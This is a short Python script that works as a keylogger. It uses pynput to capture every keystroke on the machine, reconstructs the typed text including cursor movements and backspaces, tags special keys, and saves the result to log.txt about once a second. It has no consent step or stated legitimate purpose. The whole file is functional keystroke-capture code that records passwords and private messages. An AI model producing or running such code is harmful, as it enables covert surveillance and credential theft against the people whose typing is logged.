import time
import sys
from pynput.keyboard import Listener, Key

# Buffer that contains the current text
content = []
# Cursor position in the buffer
cursor_pos = 0

# Time of the last write to the file
last_write_time = time.time()

# Interval to write to the file (in seconds)
write_interval = 1  # 1 second

# Maximum number of retries
max_retries = 5
current_retries = 0

def write_to_file():
    global current_retries

    try:
        with open("log.txt", "w", encoding="utf-8") as f:
            f.write("".join(content))
        return True
    except Exception:
        current_retries += 1
        if current_retries < max_retries:
            time.sleep(1)  # Wait for 1 second before retrying
            return write_to_file()  # Retry writing
        else:
            sys.exit(1)  # Exit the program after 5 failed attempts

def on_press(key):
    global content, cursor_pos, last_write_time

    try:
        # If the key is a standard character (letter, number, etc.)
        if hasattr(key, 'char') and key.char is not None:
            content.insert(cursor_pos, key.char)
            cursor_pos += 1

        elif key == Key.left:
            if cursor_pos > 0:
                cursor_pos -= 1

        elif key == Key.right:
            if cursor_pos < len(content):
                cursor_pos += 1

        elif key == Key.backspace:
            if cursor_pos > 0:
                content.pop(cursor_pos - 1)
                cursor_pos -= 1

        elif key == Key.enter:
            content.insert(cursor_pos, '\n')
            cursor_pos += 1

        elif key == Key.space:
            content.insert(cursor_pos, ' ')
            cursor_pos += 1

        else:
            # For any other special key (e.g., shift, ctrl...)
            rep = f"[{key.name if hasattr(key, 'name') else key}]"
            for c in rep:
                content.insert(cursor_pos, c)
                cursor_pos += 1

        # Write to the file only if 1 second has passed
        current_time = time.time()
        if current_time - last_write_time >= write_interval:
            if write_to_file():  # Try writing to the file
                last_write_time = current_time

    except Exception:
        sys.exit(1)  # Exit the program if an error occurs

# Start listening to keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()
